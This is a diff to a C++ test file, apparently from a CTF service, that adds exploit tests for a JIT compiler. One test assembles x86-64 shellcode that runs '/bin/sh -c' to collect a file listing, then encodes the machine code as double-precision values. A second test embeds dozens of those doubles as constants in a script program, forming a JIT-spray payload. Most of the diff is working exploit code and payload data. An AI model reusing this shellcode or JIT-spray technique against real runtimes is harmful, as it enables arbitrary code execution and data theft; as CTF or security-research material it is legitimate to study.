@@ -4,6 +4,7 @@
 #include <sys/mman.h>
 
 #include <gtest/gtest.h>
+#include <glog/logging.h>
 
 #include <utils/defer/defer.h>
 
@@ -568,8 +569,59 @@ TEST(Vuln, DoublesFromHexParsedCorrectly) {
     }
 }
 
+TEST(Vuln, DoubleFromHexParsedCorrectly2) {
+    auto shellText = R"(
+.section .text
+.globl _start
+
+_start:
+    xor     %rdx, %rdx
+    leaq    arg2(%rip), %rsi
+    pushq   %rsi
+    leaq    arg1(%rip), %rsi
+    pushq   %rsi
+    leaq    cmd(%rip), %rsi
+    pushq   %rsi
+    movq    %rsp, %rsi
+    leaq    cmd(%rip), %rdi
+    movq    $59, %rax
+    syscall
+    ret
+
+cmd:
+    .asciz "/bin/sh"
+arg1:
+    .asciz "-c"
+arg2:
+    .asciz "mkdir -p dataexample/ru && rm -f dataexample/ru/ctfructfructfructfructfructfru && find dataexample -type f > dataexample/ru/ctfructfructfructfructfructfru && printf '\\00\\303' >> dataexample/ru/ctfructfructfructfructfructfru"
+null:
+    .quad 0
+    )";
+
+    auto r = TranslateAssembly(shellText);
+    ASSERT_TRUE(r.Success);
+
+    while (r.Translated->size() % sizeof(double) != 0) {
+        r.Translated->push_back(0x90);
+    }
+
+    auto p = reinterpret_cast<double*>(r.Translated->data());
+
+    for (std::size_t i = 0; i < r.Translated->size() / sizeof(double); ++i) {
+        std::stringstream ss;
+        ss << std::setprecision(30) << p[i];
+        LOG(INFO) << ss.str();
+        double v;
+        ss >> v;
+
+        for (std::size_t j = 0; j < sizeof(double); ++j) {
+            ASSERT_EQ((*r.Translated)[i * sizeof(double) + j], *(reinterpret_cast<uint8_t*>(&v) + j));
+        }
+    }
+}
+
 TEST(Vuln, DISABLED_VulnMVP) {
-    assertProgramResult(R"(
+/*
 fun main() {
     a = 9.13311275417349147128740860176e+164;
     b = 2.23334226138660938778544477852e+40;
@@ -577,6 +629,51 @@ fun main() {
     d = 5.70322518485311116492001613112e-306;
     if (a < b) {
         return a + b + c + d;
+    }
+}
+*/
+    assertProgramResult(R"(
+a3b5c = 9.5729280743176072948036481258e-308;
+a3b5d = 6.17713519068332487832607366568e-308;
+a3b5e = 3.08856759534166243916303683284e-308;
+a3b5f = -1.13962551584212620632980908507e-244;
+a3b5g = -11920.0000000052332325140014291;
+a3b5h = -288586343041208000.000000000000000000000000000000;
+a3b5i = 1.08805855771401084070533089734e-306;
+a3b5j = 1.35452787268204745946619571028e+243;
+a3b5k = 2.86530674818711642217458024256e+161;
+a3b5l = 2.25851731747621915274049948662e-80;
+a3b5m = 1.59959052745373437458011589816e+219;
+a3b5n = 2.86530674785977736138496605556e+161;
+a3b5o = 2.25851731747621915274049948662e-80;
+a3b5p = 5.52559647960564516384938216975e+257;
+a3b5q = 3.4653160729132520229722030536e+185;
+a3b5r = 1.29503525642399536129001394637e+171;
+a3b5s = 1.19782304862903820345902151854e+243;
+a3b5t = 7.34483736205704024258100045432e+223;
+a3b5u = 9.03623792952455807479791709701e+271;
+a3b5v = 4.1707619911344704065794714133e+251;
+a3b5w = 2.24694137064508031465041121588e-153;
+a3b5x = 7.70880663117687154339151736e+218;
+a3b5y = 5.9362114705256860748803432818e+169;
+a3b5z = 1.19782304862903820345902151854e+243;
+a3b6a = 4.45822432662471531958872096101e+252;
+a3b6b = 5.52559648449915692702815701664e+257;
+a3b6c = 6.53747834600816911773243398146e-125;
+a3b6d = 1.33980497747332409769287086757e-152;
+a3b6e = 3.9381538893456823461224877281e-62;
+a3b6f = 3.98450022836809606757324942544e+252;
+a3b6g = 3.68777420640448786034779946279e+180;
+a3b6h = 1.19782282609787404309977881133e+243;
+a3b6i = 4.45822432662471531958872096101e+252;
+a3b6j = 5.52559648449915692702815701664e+257;
+a3b6k = 3.4653160729132520229722030536e+185;
+a3b6l = 1.48545777078629185972127173264e-319;
+a3b6m = -6.82852702054738014029865729803e-229;
+
+fun main() {
+    if (a3b6i < a3b6k) {
+        return a3b6m;
     }
 }
 )", 0.0);
